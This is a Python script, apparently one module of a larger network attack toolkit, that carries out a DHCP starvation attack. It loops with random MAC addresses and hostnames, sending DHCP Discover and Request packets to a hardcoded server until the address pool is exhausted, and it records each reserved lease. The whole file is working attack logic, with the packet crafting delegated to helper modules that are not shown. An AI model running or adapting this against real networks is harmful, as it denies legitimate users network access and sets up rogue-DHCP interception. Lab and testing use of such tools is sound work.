#!/usr/bin/python3

# Set color variables
Green = "\033[1;32m"
Blue = "\033[1;34m"
Red = "\033[1;33m"
White = "\033[0m"

# Import modules
import fct_random
import fct_dhcp
import fct_responder
import scapy.all as scapy
import time

def starvation(free_ip, args):

    reserved_IP = []
    nok = 0

    print(f"\n{Blue}[MODE]{White} Starvation IP address...")

    while nok < 5:
        
        # Get random value
        hostname = fct_random.hostname()
        xid = fct_random.transaction_id()
        mac = fct_random.valid_mac()

        # DHCP Discover
        sniff_packet = fct_dhcp.listener(mac)
        fct_dhcp.discover("ff:ff:ff:ff:ff:ff", "255.255.255.255", mac, "0.0.0.0", hostname, xid, args)
        # DHCP Offer
        dhcp_offer = fct_dhcp.listener_join(sniff_packet)
        try:
            dst_mac, offer_ip = fct_dhcp.get_offer_information(dhcp_offer)
            if offer_ip:
                # DHCP Request
                sniff_packet = fct_dhcp.listener(mac)
                fct_dhcp.request("ff:ff:ff:ff:ff:ff", "255.255.255.255", mac, "0.0.0.0", hostname, xid, "192.168.30.254", offer_ip, args)
                # DHCP Ack
                dhcp_ack = fct_dhcp.listener_join(sniff_packet)
                ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
            if ack_ip:
                print(f"{Green}[DHCP]{White} New IP reserved - {ack_ip}")
                free_ip.remove(ack_ip)
                reserved_IP.append((ack_ip, ack_mac))
                # set null variable
                del offer_ip
                del ack_ip
        except:
            nok += 1
            if nok >= 5:
                print(f"{Green}[DHCP]{White} All availables IP address seen to be reserved")

        # Output
        time.sleep(1)
    
    # End of DHCP Starvation
    print(f"\n{Blue}[MODE]{White} Listening network...")

    return reserved_IP